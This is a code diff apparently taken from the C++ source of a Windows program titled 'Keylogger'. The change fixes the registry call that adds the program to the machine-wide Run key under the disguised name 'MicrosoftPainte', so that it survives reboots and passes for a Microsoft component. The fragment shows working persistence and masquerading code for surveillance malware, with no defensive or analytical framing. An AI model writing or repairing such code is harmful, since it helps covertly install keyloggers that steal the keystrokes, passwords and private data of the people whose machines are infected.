@@ -279,7 +279,7 @@ int main()
 
 	system("title Keylogger");
 	string path;
-	string newPath = "";
+	wstring newPath = L"";
 
 	HMODULE hModule = NULL;
 	char Path[MAX_PATH];
@@ -306,7 +306,7 @@ int main()
 	HKEY key = NULL;
 	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
 	if (res == ERROR_SUCCESS) {
-		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, reinterpret_cast<const BYTE*>(newPath.c_str()), REG_SZ);
+		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)newPath.c_str(), (newPath.size()+1) * sizeof(wchar_t));
 		if (res == ERROR_SUCCESS) {
 			cout << "Sucess! \n";
 		}
